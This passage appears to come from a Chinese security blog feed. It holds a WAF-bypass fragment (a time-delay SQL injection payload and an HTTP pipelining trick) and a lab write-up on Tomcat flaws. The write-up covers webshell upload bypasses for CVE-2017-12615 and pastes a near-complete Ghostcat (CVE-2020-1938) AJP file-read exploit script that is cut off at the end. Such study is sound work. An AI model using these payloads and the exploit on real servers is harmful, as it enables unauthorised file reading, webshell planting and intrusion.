DELAY&#x27;0:0:5&#x27;--<br></code></pre></td></tr></table></figure><h2><span id="利用pipline绕过">利用pipline绕过</span></h2><p>当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。</p><p>我们可以先关闭burp的Repeater的Content-Length自动更新，然后修改connection的值为keep-alive，将攻击语句附加到正常请求后面再发送一次。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat常见漏洞</title>
      <link href="/2024/04/21/Tomcat%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/04/21/Tomcat%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>来学习一下Tomcat常见的漏洞。</p><h1><span id="tomcat是什么">Tomcat是什么</span></h1><p>tomcat就是一个免费的web服务器，和apache相同性质，主要用于jsp框架的网站，可以看作是apache的一个扩展，但是运行的时候是和apache属于不同进程的。</p><p><strong>Tomcat的目录结构</strong></p><ul><li>bin：存放tomcat的脚本文件，例如启动、关闭</li><li>conf：存放tomcat的配置文件，例如server.xml、web.xml</li><li>lib：存放tomcat运行所需要的库文件（jar包）</li><li>log：存放tomcat执行时的log文件</li><li>temp：存放tomcat运行时产生的临时文件</li><li>webapps：Web发布目录，默认情况下Web应用文件存放于此目录</li><li>work：存放jsp编译后产生的class文件</li></ul><p><img src="http://cdn.clown2024.cn/202407151443224.png" alt="image-20240425103309597"></p><blockquote><p>介绍一些重要的配置文件：</p><p><code>server.xml</code>：配置tomcat的启动端口号、host主机、Context等</p><p><code>web.xml</code>：部署描述文件，该文件描述了一些默认的servlet，部署每个webapp时都会调用这个文件</p><p><code>tomcat-users.xml</code>：tomcat的用户密码与权限</p></blockquote><h1><span id="常见绕过手法">常见绕过手法</span></h1><p><strong>Windows</strong></p><ul><li>利用&#x2F;shell.jsp::$DATA方式绕过</li><li>&#x2F;shell.jsp%20空格绕过</li><li>&#x2F;shell.jsp&#x2F; 绕过，Tomcat在处理文件时会删除最后的&#x2F;</li></ul><blockquote><p>在Windows文件系统中，<code>::$DATA</code> 是一个特殊的流名称，它用于访问NTFS文件系统中的替代数据流（Alternate Data Stream，ADS）。ADS是NTFS文件系统提供的一个特性，允许在同一个文件记录上存储多个数据流。除了默认的数据流（通常用于存储文件内容），可以创建任意数量的命名数据流。</p><p>当使用 <code>filename::$DATA</code> 这样的格式访问文件时，操作系统会忽略文件的扩展名，直接操作文件的默认数据流。</p></blockquote><p><strong>Linux</strong></p><p>&#x2F;shell.jsp&#x2F;绕过，Tomcat在处理文件时会删除最后的&#x2F;</p><h1><span id="tomcat常见漏洞">Tomcat常见漏洞</span></h1><h2><span id="tomcat任意文件写入">Tomcat任意文件写入</span></h2><p><strong>CVE-2017-12615</strong></p><p>这里开一个volfocus靶场来进行复现。</p><ul><li>影响版本：7.0.0-7.0.79</li><li>影响说明：上传webshell，任意命令执行</li><li>环境说明：Tomcat 8.5.19</li></ul><p><img src="http://cdn.clown2024.cn/202407151443225.png" alt="image-20240425110308845"></p><p><strong>漏洞原理</strong></p><p>该漏洞是利用PUT请求方法任意写入文件，类似IIS的PUT上传漏洞；所以可以利用PUT方法上传webshell到目标服务器。</p><p>在Tomcat的web.xml默认下不存在该漏洞，但如果将其中的readonly设置为false，就可以通过PUT&#x2F;DELETE进行文件操控。</p><p><img src="http://cdn.clown2024.cn/202407151443226.png" alt="image-20240425110654190"></p><p><strong>开始复现</strong></p><p>这个tomcat的版本很高但是存在漏洞，证明readonly设置为了false，我们可以去验证一下</p><p><img src="http://cdn.clown2024.cn/202407151443227.png" alt="image-20240425111140997"></p><p>可以看到设置了为false，接下来用put传文件验证一下，先抓个包</p><p><img src="http://cdn.clown2024.cn/202407151443228.png" alt="image-20240425135351443"></p><p>可以看到成功写入，我么去容器验证一下</p><p><img src="http://cdn.clown2024.cn/202407151443229.png" alt="image-20240425135427611"></p><p><img src="http://cdn.clown2024.cn/202407151443230.png" alt="image-20240425135619970"></p><p>那我们现在就可以写一个webshell进去了</p><p>但是我们不能直接上传jsp文件</p><p><img src="http://cdn.clown2024.cn/202407151443231.png" alt="image-20240425140340131"></p><p>所以就需要利用上面提到的绕过手法了，比如后面加一个&#x2F;，这里用哥斯拉生成一个jsp的shell，然后上传</p><p><img src="http://cdn.clown2024.cn/202407151443232.png" alt="image-20240425140746258"></p><p><img src="http://cdn.clown2024.cn/202407151443233.png" alt="image-20240425140919617"></p><p>然后去连接即可</p><p><img src="http://cdn.clown2024.cn/202407151443234.png" alt="image-20240425141224771"></p><h2><span id="tomcat任意文件读取">Tomcat任意文件读取</span></h2><p><strong>CVE-2020-1938</strong></p><ul><li>影响版本：9.x&lt;9.0.31，8.x&lt;8.5.51，7.x&lt;7.0.100，6.x</li><li>影响说明：读取webapp下的所有文件</li></ul><p><strong>漏洞原理</strong></p><p>该漏洞是由于Tomcat AJP协议存在缺陷而导致，由于tomcat默认开启的AJP服务(8009端口)存在一处文件包含漏洞，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。 </p><p>这里是一张tomcat的架构图：</p><p><img src="http://cdn.clown2024.cn/202407151443235.png" alt="img"></p><p>从图中可以看出，Tomcat最顶层的容器是Server，其中包含至少一个或者多个Service，一个Service有多个Connector和一个Container组成。这两个组件的作用为:</p><ol><li>Connector用于处理连接相关的事情，并提供Socket与Request和Response相关的转化。</li><li>Container用于封装和管理Servlet，以及具体处理Request请求。</li></ol><p>tomcat默认的 conf&#x2F;server.xml中配置了2个 Connector，一个为8080的对外提供的HTTP协议(1.1版本)端口，默认监听地址:0.0.0.0:8080，另外一个就是默认的8009 AJP协议(1.3版本)端口默认监听地址为:0.0.0.0:8009，两个端口默认均监听在外网ip。</p><p>这里复现利用网上的一个脚本：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi%EF%BC%8C%E8%BF%99%E9%87%8C%E8%B4%B4%E4%B8%80%E4%B8%8B%E8%84%9A%E6%9C%AC%EF%BC%9A">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi，这里贴一下脚本：</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span><br><span class="hljs-comment">#by ydhcui</span><br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-comment"># Some references:</span><br><span class="hljs-comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_string</span>(<span class="hljs-params">s</span>):<br><span class="hljs-keyword">if</span> s <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br><span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&gt;h&quot;</span>, -<span class="hljs-number">1</span>)<br>l = <span class="hljs-built_in">len</span>(s)<br><span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&gt;H%dsb&quot;</span> % l, l, s.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>), <span class="hljs-number">0</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unpack</span>(<span class="hljs-params">stream, fmt</span>):<br>size = struct.calcsize(fmt)<br>buf = stream.read(size)<br><span class="hljs-keyword">return</span> struct.unpack(fmt, buf)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unpack_string</span>(<span class="hljs-params">stream</span>):<br>size, = unpack(stream, <span class="hljs-string">&quot;&gt;h&quot;</span>)<br><span class="hljs-keyword">if</span> size == -<span class="hljs-number">1</span>: <span class="hljs-comment"># null string</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>res, = unpack(stream, <span class="hljs-string">&quot;%ds&quot;</span> % size)<br>stream.read(<span class="hljs-number">1</span>) <span class="hljs-comment"># \0</span><br><span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NotFoundException</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br><span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AjpBodyRequest</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-comment"># server == web server, container == servlet</span><br>SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)<br>MAX_REQUEST_LENGTH = <span class="hljs-number">8186</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data_stream, data_len, data_direction=<span class="hljs-literal">None</span></span>):<br>self.data_stream = data_stream<br>self.data_len = data_len<br>self.data_direction = data_direction<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">serialize</span>(<span class="hljs-params">self</span>):<br>data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br><span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&gt;bbH&quot;</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x00</span>)<br><span class="hljs-keyword">else</span>:<br>res = struct.pack(<span class="hljs-string">&quot;&gt;H&quot;</span>, <span class="hljs-built_in">len</span>(data))<br>res += data<br><span class="hljs-keyword">if</span> self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:<br>header = struct.pack(<span class="hljs-string">&quot;&gt;bbH&quot;</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x34</span>, <span class="hljs-built_in">len</span>(res))<br><span class="hljs-keyword">else</span>:<br>header = struct.pack(<span class="hljs-string">&quot;&gt;bbH&quot;</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-built_in">len</span>(res))<br><span class="hljs-keyword">return</span> header + res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_and_receive</span>(<span class="hljs-params">self, socket, stream</span>):<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>data = self.serialize()<br>socket.send(data)<br>r = AjpResponse.receive(stream)<br><span class="hljs-keyword">while</span> r.prefix_code != AjpResponse.GET_BODY_CHUNK <span class="hljs-keyword">and</span> r.prefix_code != AjpResponse.SEND_HEADERS:<br>r = AjpResponse.receive(stream)<br><br><span class="hljs-keyword">if</span> r.prefix_code == AjpResponse.SEND_HEADERS <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">4</span>:<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AjpForwardRequest</span>(<span class="hljs-title class_ inherited__">object</span>):<br>_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>)<br>REQUEST_METHODS = &#123;<span class="hljs-string">&#x27;GET&#x27;</span>: GET, <span class="hljs-string">&#x27;POST&#x27;</span>: POST, <span class="hljs-string">&#x27;HEAD&#x27;</span>: HEAD, <span class="hljs-string">&#x27;OPTIONS&#x27;</span>: OPTIONS, <span class="hljs-string">&#x27;PUT&#x27;</span>: PUT, <span class="hljs-string">&#x27;DELETE&#x27;</span>: DELETE, <span class="hljs-string">&#x27;TRACE&#x27;</span>: TRACE&#125;<br><span class="hljs-comment"># server == web server, container == servlet</span><br>SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)<br>COMMON_HEADERS = [<span class="hljs-string">&quot;SC_REQ_ACCEPT&quot;</span>,<br><span class="hljs-string">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span>, <span class="hljs-string">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span>, <span class="hljs-string">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span>, <span class="hljs-string">&quot;SC_REQ_AUTHORIZATION&quot;</span>,<br><span class="hljs-string">&quot;SC_REQ_CONNECTION&quot;</span>, <span class="hljs-string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>, <span class="hljs-string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>, <span class="hljs-string">&quot;SC_REQ_COOKIE&quot;</span>, <span class="hljs-string">&quot;SC_REQ_COOKIE2&quot;</span>,<br><span class="hljs-string">&quot;SC_REQ_HOST&quot;</span>, <span class="hljs-string">&quot;SC_REQ_PRAGMA&quot;</span>, <span class="hljs-string">&quot;SC_REQ_REFERER&quot;</span>, <span class="hljs-string">&quot;SC_REQ_USER_AGENT&quot;</span><br>]<br>ATTRIBUTES = [<span class="hljs-string">&quot;context&quot;</span>, <span class="hljs-string">&quot;servlet_path&quot;</span>, <span class="hljs-string">&quot;remote_user&quot;</span>, <span class="hljs-string">&quot;auth_type&quot;</span>, <span class="hljs-string">&quot;query_string&quot;</span>, <span class="hljs-string">&quot;route&quot;</span>, <span class="hljs-string">&quot;ssl_cert&quot;</span>, <span class="hljs-string">&quot;ssl_cipher&quot;</span>, <span class="hljs-string">&quot;ssl_session&quot;</span>, <span class="hljs-string">&quot;req_attribute&quot;</span>, <span class="hljs-string">&quot;ssl_key_size&quot;</span>, <span class="hljs-string">&quot;secret&quot;</span>, <span class="hljs-string">&quot;stored_method&quot;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data_direction=<span class="hljs-literal">None</span></span>):<br>self.prefix_code = <span class="hljs-number">0x02</span><br>self.method = <span class="hljs-literal">None</span><br>self.protocol = <span class="hljs-literal">None</span><br>self.req_uri = <span class="hljs-literal">None</span><br>self.remote_addr = <span class="hljs-literal">None</span><br>self.remote_host = <span class="hljs-literal">None</span><br>self.server_name = <span class="hljs-literal">None</span><br>self.server_port = <span class="hljs-literal">None</span><br>self.is_ssl = <span class="hljs-literal">None</span><br>self.num_headers = <span class="hljs-literal">None</span><br>self.request_headers = <span class="hljs-literal">None</span><br>self.attributes = <span class="hljs-literal">None</span><br>self.data_direction = data_direction<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_headers</span>(<span class="hljs-params">self</span>):<br>self.num_headers = <span class="hljs-built_in">len</span>(self.request_headers)<br>res = <span class="hljs-string">&quot;&quot;</span><br>res = struct.pack(<span class="hljs-string">&quot;&gt;h&quot;</span>, self.num_headers)<br><span class="hljs-keyword">for</span> h_name <span class="hljs-keyword">in</span> self.request_headers:<br><span class="hljs-keyword">if</span> h_name.startswith(<span class="hljs-string">&quot;SC_REQ&quot;</span>):<br>code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + <span class="hljs-number">1</span><br>res += struct.pack(<span class="hljs-string">&quot;BB&quot;</span>, <span class="hljs-number">0xA0</span>, code)<br><span class="hljs-keyword">else</span>:<br>res += pack_string(h_name)<br><br>res += pack_string(self.request_headers[h_name])<br><span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_attributes</span>(<span class="hljs-params">self</span>):<br>res = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> self.attributes:<br>a_name = attr[<span class="hljs-string">&#x27;name&#x27;</span>]<br>code = AjpForwardRequest.ATTRIBUTES.index(a_name) + <span class="hljs-number">1</span><br>res += struct.pack(<span class="hljs-string">&quot;b&quot;</span>, code)<br><span class="hljs-keyword">if</span> a_name == <span class="hljs-string">&quot;req_attribute&quot;</span>:<br>aa_name, a_value = attr[<span class="hljs-string">&#x27;value&#x27;</span>]<br>res += pack_string(aa_name)<br>res += pack_string(a_value)<br><span class="hljs-keyword">else</span>:<br>res += pack_string(attr[<span class="hljs-string">&#x27;value&#x27;</span>])<br>res += struct.pack(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0xFF</span>)<br><span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">serialize</span>(<span class="hljs-params">self</span>):<br>res = <span class="hljs-string">&quot;&quot;</span><br>res = struct.pack(<span class="hljs-string">&quot;bb&quot;</span>, self.prefix_code, self.method)<br>res += pack_string(self.protocol)<br>res += pack_string(self.req_uri)<br>res += pack_string(self.remote_addr)<br>res += pack_string(self.remote_host)<br>res += pack_string(self.server_name)<br>res += struct.pack(<span class="hljs-string">&quot;&gt;h&quot;</span>, self.server_port)<br>res += struct.pack(<span class="hljs-string">&quot;?&quot;</span>, self.is_ssl)<br>res += self.pack_headers()<br>res += self.pack_attributes()<br><span class="hljs-keyword">if</span> self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:<br>header = struct.pack(<span class="hljs-string">&quot;&gt;bbh&quot;</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x34</span>, <span class="hljs-built_in">len</span>(res))<br><span class="hljs-keyword">else</span>:<br>header = struct.pack(<span class="hljs-string">&quot;&gt;bbh&quot;</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-built_in">len</span>(res))<br><span class="hljs-keyword">return</span> header + res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, raw_packet</span>):<br>stream = StringIO(raw_packet)<br>self.magic1, self.magic2, data_len = unpack(stream, <span class="hljs-string">&quot;bbH&quot;</span>)<br>self.prefix_code, self.method = unpack(stream, <span class="hljs-string">&quot;bb&quot;</span>)<br>self.protocol = unpack_string(stream)<br>self.req_uri = unpack_string(stream)<br>self.remote_addr = unpack_string(stream)<br>self.remote_host = unpack_string(stream)<br>self.server_name = unpack_string(stream)<br>self.server_port = unpack(stream, <span class="hljs-string">&quot;&gt;h&quot;</span>)<br>self.is_ssl = unpack(stream, <span class="hljs-string">&quot;?&quot;</span>)<br>self.num_headers, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br>self.request_headers = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.num_headers):<br>code, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br><span class="hljs-keyword">if</span> code &gt; <span class="hljs-number">0xA000</span>:<br>h_name = AjpForwardRequest.COMMON_HEADERS[code - <span class="hljs-number">0xA001</span>]<br><span class="hljs-keyword">else</span>:<br>h_name = unpack(stream, <span class="hljs-string">&quot;%ds&quot;</span> % code)<br>stream.read(<span class="hljs-number">1</span>) <span class="hljs-comment"># \0</span><br>h_value = unpack_string(stream)<br>self.request_headers[h_name] = h_value<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_and_receive</span>(<span class="hljs-params">self, socket, stream, save_cookies=<span class="hljs-literal">False</span></span>):<br>res = []<br>i = socket.sendall(self.serialize())<br><span class="hljs-keyword">if</span> self.method == AjpForwardRequest.POST:<br><span class="hljs-keyword">return</span> res<br><br>r = AjpResponse.receive(stream)<br><span class="hljs-keyword">assert</span> r.prefix_code == AjpResponse.SEND_HEADERS<br>res.append(r)<br><span class="hljs-keyword">if</span> save_cookies <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;Set-Cookie&#x27;</span> <span class="hljs-keyword">in</span> r.response_headers:<br>self.headers[<span class="hljs-string">&#x27;SC_REQ_COOKIE&#x27;</span>] = r.response_headers[<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>]<br><br><span class="hljs-comment"># read body chunks and end response packets</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = AjpResponse.receive(stream)<br>res.append(r)<br><span class="hljs-keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">elif</span> r.prefix_code == AjpResponse.SEND_BODY_CHUNK:<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">raise</span> NotImplementedError<br><span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AjpResponse</span>(<span class="hljs-title class_ inherited__">object</span>):<br>_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>)<br>COMMON_SEND_HEADERS = [<br><span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;Content-Language&quot;</span>, <span class="hljs-string">&quot;Content-Length&quot;</span>, <span class="hljs-string">&quot;Date&quot;</span>, <span class="hljs-string">&quot;Last-Modified&quot;</span>,<br><span class="hljs-string">&quot;Location&quot;</span>, <span class="hljs-string">&quot;Set-Cookie&quot;</span>, <span class="hljs-string">&quot;Set-Cookie2&quot;</span>, <span class="hljs-string">&quot;Servlet-Engine&quot;</span>, <span class="hljs-string">&quot;Status&quot;</span>, <span class="hljs-string">&quot;WWW-Authenticate&quot;</span><br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, stream</span>):<br><span class="hljs-comment"># read headers</span><br>self.magic, self.data_length, self.prefix_code = unpack(stream, <span class="hljs-string">&quot;&gt;HHb&quot;</span>)<br><br><span class="hljs-keyword">if</span> self.prefix_code == AjpResponse.SEND_HEADERS:<br>self.parse_send_headers(stream)<br><span class="hljs-keyword">elif</span> self.prefix_code == AjpResponse.SEND_BODY_CHUNK:<br>self.parse_send_body_chunk(stream)<br><span class="hljs-keyword">elif</span> self.prefix_code == AjpResponse.END_RESPONSE:<br>self.parse_end_response(stream)<br><span class="hljs-keyword">elif</span> self.prefix_code == AjpResponse.GET_BODY_CHUNK:<br>self.parse_get_body_chunk(stream)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">raise</span> NotImplementedError<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_send_headers</span>(<span class="hljs-params">self, stream</span>):<br>self.http_status_code, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br>self.http_status_msg = unpack_string(stream)<br>self.num_headers, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br>self.response_headers = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.num_headers):<br>code, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br><span class="hljs-keyword">if</span> code &lt;= <span class="hljs-number">0xA000</span>: <span class="hljs-comment"># custom header</span><br>h_name, = unpack(stream, <span class="hljs-string">&quot;%ds&quot;</span> % code)<br>stream.read(<span class="hljs-number">1</span>) <span class="hljs-comment"># \0</span><br>h_value = unpack_string(stream)<br><span class="hljs-keyword">else</span>:<br>h_name = AjpResponse.COMMON_SEND_HEADERS[code-<span class="hljs-number">0xA001</span>]<br>h_value = unpack_string(stream)<br>self.response_headers[h_name] = h_value<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_send_body_chunk</span>(<span class="hljs-params">self, stream</span>):<br>self.data_length, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br>self.data = stream.read(self.data_length+<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_end_response</span>(<span class="hljs-params">self, stream</span>):<br>self.reuse, = unpack(stream, <span class="hljs-string">&quot;b&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_get_body_chunk</span>(<span class="hljs-params">self, stream</span>):<br>rlen, = unpack(stream, <span class="hljs-string">&quot;&gt;H&quot;</span>)<br><span class="hljs-keyword">return</span> rlen<br><br><span class="hljs-meta">@staticmethod</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receive</span>(<span class="hljs-params">stream</span>):<br>r = AjpResponse()<br>r.parse(stream)<br><span class="hljs-keyword">return</span> r<br><br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_ajp_forward_request</span>(<span class="hljs-params">target_host, req_uri, method=AjpForwardRequest.GET</span>):<br>fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)<br>fr.method = method<br>fr.protocol = <span class="hljs-string">&quot;HTTP/1.1&quot;</span><br>fr.req_uri = req_uri<br>fr.remote_addr = target_host<br>fr.remote_host = <span class="hljs-literal">None</span><br>fr.server_name = target_host<br>fr.server_port = <span class="hljs-number">80</span><br>fr.request_headers = &#123;<br><span class="hljs-string">&#x27;SC_REQ_ACCEPT&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span>,<br><span class="hljs-string">&#x27;SC_REQ_CONNECTION&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br><span class="hljs-string">&#x27;SC_REQ_CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&#x27;SC_REQ_HOST&#x27;</span>: target_host,<br><span class="hljs-string">&#x27;SC_REQ_USER_AGENT&#x27;</span>: <span class="hljs-string">&#x27;Mozilla&#x27;</span>,<br><span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate, sdch&#x27;</span>,<br><span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br><span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br><span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;max-age=0&#x27;</span><br>&#125;<br>fr.is_ssl = <span class="hljs-literal">False</span><br>fr.attributes = []<br><span class="hljs-keyword">return</span> fr<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_host, target_port</span>):<br>self.target_host = target_host<br>self.target_port = target_port<br><br>self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>self.socket.connect((target_host, target_port))<br>self.stream = self.socket.makefile(<span class="hljs-string">&quot;rb&quot;</span>, bufsize=<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">perform_request</span>(<span class="hljs-params">self, req_uri, headers=&#123;&#125;, method=<span class="hljs-string">&#x27;GET&#x27;</span>, user=<span class="hljs-literal">None</span>, password=<span class="hljs-literal">None</span>, attributes=[]</span>):<br>self.req_uri = req_uri<br>self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))<br><span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> password <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>self.forward_request.request_headers[<span class="hljs-string">&#x27;SC_REQ_AUTHORIZATION&#x27;</span>] = <span class="hljs-string">&quot;Basic &quot;</span> + (<span class="hljs-string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> headers:<br>self.forward_request.request_headers[h] = headers[h]<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> attributes:<br>self.forward_request.attributes.append(a)<br>responses = self.forward_request.send_and_receive(self.socket, self.stream)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(responses) == <span class="hljs-number">0</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>snd_hdrs_res = responses[<span class="hljs-number">0</span>]<br>data_res = responses[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data_res) == <span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No data in response. Headers:%s\n&quot;</span> % snd_hdrs_res.response_headers)<br><span class="hljs-keyword">return</span> snd_hdrs_res, data_res<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">javax.servlet.include.request_uri</span><br><span class="hljs-string">javax.servlet.include.path_info</span><br><span class="hljs-string">javax.servlet.include.servlet_path</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> argparse<br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Hostname or IP to attack&quot;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">type</span>=<span 